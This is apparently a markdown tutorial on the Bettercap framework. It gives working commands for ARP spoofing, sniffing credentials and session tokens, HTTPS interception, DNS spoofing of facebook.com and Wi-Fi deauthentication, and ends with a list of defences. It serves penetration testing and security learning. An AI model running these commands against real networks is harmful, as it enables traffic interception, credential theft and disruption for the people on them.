# Bettercap

A powerful, modular, and modern framework for network reconnaissance, MITM attacks, protocol manipulation, and traffic monitoring.

---

## 📌 Overview

**Bettercap** is a Swiss‑army knife for network attacks and monitoring. It replaces older tools like Ettercap and provides:

* Network scanning
* ARP spoofing
* DNS spoofing
* HTTP(S) interception
* Wi-Fi attacks
* Credential sniffing
* Protocol manipulation

It is widely used by:

* Penetration testers
* Red teamers
* SOC analysts (for detection labs)
* Network security researchers

---

## 🛠 Installation

Bettercap comes preinstalled on Kali Linux.

If you need to install it manually:

```bash
sudo apt update
sudo apt install bettercap
```

Check version:

```bash
bettercap -version
```

---

## 🚀 Starting Bettercap

Find your network interface:

```bash
ip a
```

Start Bettercap:

```bash
sudo bettercap -iface wlan0
```

(Replace `wlan0` with your actual interface.)

---

## 🔍 Network Reconnaissance

Enable network probing:

```text
net.probe on
net.recon on
```

Show discovered hosts:

```text
net.show
```

Bettercap will list:

* IP addresses
* MAC addresses
* Device manufacturers
* Open ports (if detected)

---

## 🎯 ARP Spoofing (MITM)

Set target:

```text
set arp.spoof.targets 192.168.1.15
```

Start spoofing:

```text
arp.spoof on
```

Stop it:

```text
arp.spoof off
```

---

## 📡 Sniffing Traffic

Enable sniffing:

```text
net.sniff on
```

You may capture:

* HTTP credentials
* Cookies
* Parameters
* Session tokens

Save traffic to file:

```text
set net.sniff.output /home/user/capture.pcap
net.sniff on
```

---

## 🔐 HTTPS Interception

Attempt to intercept HTTPS:

```text
https.proxy on
```

Note: Modern browsers block most SSL stripping attempts.

---

## 🌐 DNS Spoofing

Set a spoofed domain:

```text
set dns.spoof.domains facebook.com
set dns.spoof.address 192.168.1.100
```

Start DNS spoofing:

```text
dns.spoof on
```

---

## 📶 Wi-Fi Attacks (Bettercap WiFi)

Enable Wi-Fi module:

```bash
sudo bettercap -iface wlan0mon
```

Scan networks:

```text
wifi.recon on
```

Deauth a target:

```text
wifi.deauth XX:XX:XX:XX:XX:XX
```

---

## 📚 Useful Commands Cheat Sheet

| Purpose         | Command          |
| --------------- | ---------------- |
| Show help       | `help`           |
| Show modules    | `modules`        |
| Load module     | `caplets.update` |
| Start ARP spoof | `arp.spoof on`   |
| Sniff traffic   | `net.sniff on`   |
| DNS spoofing    | `dns.spoof on`   |
| HTTPS proxy     | `https.proxy on` |
| Quit Bettercap  | `quit`           |

---

## 🛡 How to Defend Against Bettercap Attacks

* Use **WPA3** (or WPA2 with strong passwords)
* Disable **WPS**
* Use **VPN** to encrypt all traffic
* Enable **client isolation** on Wi-Fi
* Update router firmware
* Use **HTTPS everywhere**
* Use enterprise features like **Dynamic ARP Inspection (DAI)** when available

---

## 📘 Conclusion

Bettercap is one of the most powerful tools in modern offensive security. It offers advanced modules for reconnaissance, MITM, spoofing, and Wi-Fi attacks. Understanding how it works helps both attackers and defenders strengthen network security.
